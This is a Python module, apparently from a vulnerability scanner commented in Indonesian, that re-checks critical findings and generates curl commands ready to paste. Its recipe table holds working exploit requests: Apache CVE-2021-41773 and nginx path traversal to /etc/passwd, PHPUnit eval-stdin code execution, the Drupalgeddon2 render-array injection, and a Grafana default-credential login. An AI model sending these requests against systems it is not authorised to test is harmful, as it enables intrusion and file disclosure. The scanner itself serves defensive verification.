"""Active curl-equivalent verification scanner.

Modul ini BUKAN scanner pencari celah baru — ia adalah POST-PROCESSOR yang
mengambil finding dari modul lain dan melakukan RE-VALIDASI aktif dengan
request curl-equivalent yang presisi. Tujuan:

1. Konfirmasi ulang bahwa celah benar-benar terbuka SAAT INI (bukan cached).
2. Menghasilkan perintah curl SIAP COPY-PASTE yang bisa dipakai tim dev
   untuk reproduksi langsung.
3. Menambahkan field `curl_verify_cmd` ke Finding.extra agar PDF report
   bisa menampilkan section "Cara Akses Celah (Perintah Siap Pakai)".

Modul ini jalan paling TERAKHIR (setelah semua scanner lain selesai) dan
hanya memproses finding dengan severity CRITICAL atau HIGH.

Cara kerja:
- Untuk tiap finding CRITICAL/HIGH yang punya URL, modul akan:
  1. Rekonstruksi HTTP request yang sama dengan yang dipakai scanner asli.
  2. Kirim ulang request tersebut.
  3. Validasi bahwa response masih matching (status code + signature).
  4. Generate perintah curl yang persis — lengkap dengan header, data, dan
     komentar penjelasan.
  5. Simpan di Finding.extra["curl_verify_cmd"] dan
     Finding.extra["curl_verified"] = True/False.

Ini memastikan: "celah benar-benar terbuka, dan ini cara mengaksesnya".
"""
from __future__ import annotations

import re
from urllib.parse import urlparse

from cyberloka.core import Finding, HttpClient, Severity, Target
from cyberloka.core.config import ScanConfig

# Mapping module → cara merekonstruksi request verifikasi.
# Setiap entry: (method, path_suffix, headers_extra, body, signature_in_response)
# Bila None untuk field, pakai default dari finding.target/urls.
VERIFY_RECIPES: dict[str, dict] = {
    "apache_path_confusion": {
        "method": "GET",
        "path": "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd",
        "signature": "root:x:0:0:",
        "comment": "# CVE-2021-41773: path traversal via encoded dots",
    },
    "phpunit_rce": {
        "method": "POST",
        "path": "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
        "body": "<?php echo md5(31337); ?>",
        "content_type": "text/plain",
        "signature": "0d59b5dee72c0a82b22b85ab1bb59a3a",
        "comment": "# CVE-2017-9841: PHPUnit eval-stdin RCE",
    },
    "docker_remote_api": {
        "method": "GET",
        "path": "/version",
        "signature": '"ApiVersion"',
        "comment": "# Docker Remote API tanpa auth",
    },
    "elasticsearch_unauth": {
        "method": "GET",
        "path": "/_cluster/health",
        "signature": "cluster_name",
        "comment": "# Elasticsearch tanpa autentikasi",
    },
    "spring_actuator_rce": {
        "method": "GET",
        "path": "/actuator/env",
        "signature": "propertySources",
        "comment": "# Spring Boot Actuator exposed",
    },
    "jenkins_unauth_console": {
        "method": "GET",
        "path": "/script",
        "signature": "Groovy script",
        "comment": "# Jenkins Script Console tanpa auth",
    },
    "solr_admin_unauth": {
        "method": "GET",
        "path": "/solr/admin/cores?action=STATUS&wt=json",
        "signature": "responseHeader",
        "comment": "# Apache Solr admin tanpa auth",
    },
    "nginx_off_by_slash": {
        "method": "GET",
        "path": "/static../etc/passwd",
        "signature": "root:x:0:0:",
        "comment": "# Nginx alias off-by-slash traversal",
    },
    "grafana_default_login": {
        "method": "POST",
        "path": "/login",
        "body": '{"user":"admin","password":"admin"}',
        "content_type": "application/json",
        "signature": "grafana_session",
        "check_cookies": True,
        "comment": "# Grafana default credentials admin/admin",
    },
    "wp_xmlrpc_amplify": {
        "method": "POST",
        "path": "/xmlrpc.php",
        "body": '<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>',
        "content_type": "text/xml",
        "signature": "pingback.ping",
        "comment": "# WordPress xmlrpc.php aktif",
    },
    "drupalgeddon2": {
        "method": "POST",
        "path": "/?q=user/password&name[%23post_render][]=printf&name[%23markup]=CYBLOK&name[%23type]=markup",
        "body": "form_id=user_pass&_triggering_element_name=name",
        "content_type": "application/x-www-form-urlencoded",
        "signature": "CYBLOK",
        "comment": "# CVE-2018-7600: Drupalgeddon2 RCE",
    },
    "firebase_open_db": {
        "method": "GET",
        "path": "/.json",
        "signature": "{",
        "comment": "# Firebase Realtime DB rules .read=true",
    },
    "adminer_exposed": {
        "method": "GET",
        "path": "/adminer.php",
        "signature": "Adminer",
        "comment": "# Adminer.php ter-expose di webroot",
    },
    "phpmyadmin_exposed": {
        "method": "GET",
        "path": "/phpmyadmin/",
        "signature": "phpMyAdmin",
        "comment": "# phpMyAdmin terbuka publik",
    },
    "gitlab_unauth_api": {
        "method": "GET",
        "path": "/api/v4/users?per_page=5",
        "signature": '"username"',
        "comment": "# GitLab API tanpa autentikasi",
    },
    "kibana_unauth": {
        "method": "GET",
        "path": "/api/status",
        "signature": "version",
        "comment": "# Kibana terbuka tanpa auth",
    },
    "prometheus_unauth": {
        "method": "GET",
        "path": "/metrics",
        "signature": "# HELP",
        "comment": "# Prometheus metrics terbuka",
    },
    "cors_null_origin": {
        "method": "GET",
        "path": "/api/me",
        "headers": {"Origin": "null"},
        "signature": "Access-Control-Allow-Origin",
        "check_headers": True,
        "comment": "# CORS null origin + credentials",
    },
    "s3_world_writable": {
        "method": "GET",
        "path": "/",
        "signature": "ListBucketResult",
        "comment": "# S3 bucket public listing",
    },
}


def _build_curl_cmd(method: str, url: str, headers: dict | None = None,
                    body: str | None = None, content_type: str | None = None,
                    comment: str = "") -> str:
    """Build a curl command string ready for copy-paste."""
    parts = ["curl"]
    if method != "GET":
        parts.append(f"-X {method}")
    parts.append("-i")  # include headers
    parts.append("-s")  # silent

    if headers:
        for k, v in headers.items():
            parts.append(f"-H '{k}: {v}'")
    if content_type:
        parts.append(f"-H 'Content-Type: {content_type}'")
    if body:
        # Escape single quotes in body
        safe_body = body.replace("'", "'\\''")
        if len(safe_body) > 200:
            parts.append(f"-d '{safe_body[:200]}...'")
        else:
            parts.append(f"-d '{safe_body}'")
    parts.append(f"'{url}'")

    cmd = " \\\n  ".join(parts)
    if comment:
        cmd = f"{comment}\n{cmd}"
    return cmd


def _verify_finding(client: HttpClient, finding: Finding, target: Target) -> dict:
    """Re-verify a finding and return curl info dict.

    Returns dict with keys:
      - verified: bool
      - curl_cmd: str (full curl command)
      - response_status: int
      - response_match: bool
    """
    module = (finding.module or "").lower()
    recipe = VERIFY_RECIPES.get(module)

    # Kalau ada recipe spesifik, pakai itu
    if recipe:
        # Build URL
        if "://" in (recipe.get("path") or ""):
            url = recipe["path"]
        else:
            base = target.origin if hasattr(target, 'origin') else target.base_url
            url = base.rstrip("/") + (recipe.get("path") or "")

        method = recipe.get("method", "GET")
        headers = recipe.get("headers")
        body = recipe.get("body")
        content_type = recipe.get("content_type")
        signature = recipe.get("signature", "")
        comment = recipe.get("comment", "")
        check_cookies = recipe.get("check_cookies", False)
        check_headers = recipe.get("check_headers", False)

        # Send request
        kwargs = {"allow_redirects": False}
        if headers:
            kwargs["headers"] = headers
        req_headers = dict(headers or {})
        if content_type:
            req_headers["Content-Type"] = content_type
            kwargs["headers"] = req_headers

        if method == "GET":
            resp = client.get(url, **kwargs)
        elif method == "POST":
            kwargs["data"] = body
            resp = client.post(url, **kwargs)
        else:
            resp = client.request(method, url, data=body, **kwargs)

        if resp is None:
            return {"verified": False, "curl_cmd": _build_curl_cmd(
                method, url, headers, body, content_type, comment
            ), "response_status": 0, "response_match": False}

        # Check signature
        resp_body = resp.text or ""
        resp_headers_str = str(dict(resp.headers))
        matched = False

        if check_cookies:
            cookie_str = " ".join(c.name for c in resp.cookies) if hasattr(resp, 'cookies') else ""
            matched = signature.lower() in cookie_str.lower()
        elif check_headers:
            matched = signature.lower() in resp_headers_str.lower()
        else:
            matched = signature in resp_body

        curl_cmd = _build_curl_cmd(method, url, headers, body, content_type, comment)

        return {
            "verified": matched and resp.status_code < 500,
            "curl_cmd": curl_cmd,
            "response_status": resp.status_code,
            "response_match": matched,
        }

    # Fallback: pakai URL dari finding langsung
    url = (finding.urls[0] if finding.urls else finding.target or "")
    if not url or not url.startswith(("http://", "https://")):
        return {"verified": False, "curl_cmd": f"# No URL available for {module}",
                "response_status": 0, "response_match": False}

    # Simple GET verification
    resp = client.get(url, allow_redirects=False)
    curl_cmd = _build_curl_cmd("GET", url, comment=f"# Verifikasi modul: {module}")

    if resp is None:
        return {"verified": False, "curl_cmd": curl_cmd,
                "response_status": 0, "response_match": False}

    # For fallback: verified if status < 400 (endpoint masih accessible)
    verified = resp.status_code < 400
    return {
        "verified": verified,
        "curl_cmd": curl_cmd,
        "response_status": resp.status_code,
        "response_match": verified,
    }


def run(target: Target, config: ScanConfig) -> list[Finding]:
    """This module doesn't produce new findings — it enriches existing ones.

    It's called by scanner.py AFTER all other modules, and modifies
    findings in-place via config._curl_verify_results (side-channel).

    However, since the scanner orchestrator expects list[Finding], we return
    an empty list. The actual enrichment happens in post_process().
    """
    return []


def post_process(findings: list[Finding], target: Target, config: ScanConfig) -> list[Finding]:
    """Re-verify CRITICAL/HIGH findings and attach curl commands.

    Called by scanner.py after _enrich_findings(). Modifies findings in-place.
    """
    client = HttpClient(config)
    try:
        for f in findings:
            if f.severity not in (Severity.CRITICAL, Severity.HIGH):
                continue

            result = _verify_finding(client, f, target)

            # Attach curl command to finding.extra
            f.extra["curl_verify_cmd"] = result["curl_cmd"]
            f.extra["curl_verified"] = result["verified"]
            f.extra["curl_response_status"] = result["response_status"]

            # If verification FAILED, add note
            if not result["verified"] and result["response_status"] > 0:
                f.extra["curl_verify_note"] = (
                    f"Re-verifikasi mengembalikan HTTP {result['response_status']} "
                    f"(signature tidak match). Celah mungkin sudah di-patch "
                    f"atau hanya intermittent."
                )
    finally:
        client.close()
    return findings
